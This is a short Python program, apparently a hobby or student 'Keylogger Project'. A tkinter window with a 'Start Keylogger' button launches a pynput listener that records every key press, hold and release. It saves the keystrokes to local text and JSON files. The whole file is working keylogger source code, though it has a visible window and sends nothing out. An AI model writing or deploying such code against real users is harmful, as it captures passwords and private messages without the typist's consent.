import tkinter as tk
from tkinter import *
from pynput import keyboard #for accessing the keyboard
import json #for storing the keystrokes in json file

root = tk.Tk()
root.geometry("300x300")
root.title("Keylogger Project")

key_list = []
x = False #for checking key is in held state or not 
key_strokes=""

#store the accessed keys into a normal file
def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

#store the accessed keys into a json file
def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)


# two functions press and release for accessing the keystrokes
def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)


def on_release(key):
    global x, key_list,key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))

def butaction():
    print("[+] Running Keylogger Successfully!\n[!] Saving the keylogs in the 'logs.json'")
    # set a listener
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

empty = Label(root, text=" ").grid(row=0,column=0)
empty = Label(root, text=" ").grid(row=1,column=0)
empty = Label(root, text=" ").grid(row=2,column=0)
empty = Label(root, text=" ").grid(row=3,column=0)
empty = Label(root, text="KeyLogger Project" , font='Verdana 11 bold').grid(row=4,column=3)
empty = Label(root, text=" ").grid(row=5,column=0)
empty = Label(root, text=" ").grid(row=6,column=0)
empty = Label(root, text=" ").grid(row=7,column=0)

Button(root, text="Start Keylogger",command=butaction).grid(row=8,column=3)
root.mainloop()


